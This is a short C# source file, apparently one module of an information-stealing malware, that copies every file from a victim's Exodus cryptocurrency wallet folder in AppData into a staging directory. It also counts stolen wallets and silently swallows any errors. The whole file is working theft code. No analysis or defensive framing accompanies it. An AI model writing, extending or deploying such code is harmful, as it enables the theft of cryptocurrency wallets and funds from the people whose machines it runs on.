using System.IO;

namespace SHARP
{
    internal class Exodus
    {
      public static string ExodusDir = "\\Wallets\\Exodus\\";

      public static void ExodusStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Exodus\\exodus.wallet\\").GetFiles())
          {
            Directory.CreateDirectory(directorypath + Exodus.ExodusDir);
            file.CopyTo(directorypath + Exodus.ExodusDir + file.Name);
          }
          ++Counting.exodus;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
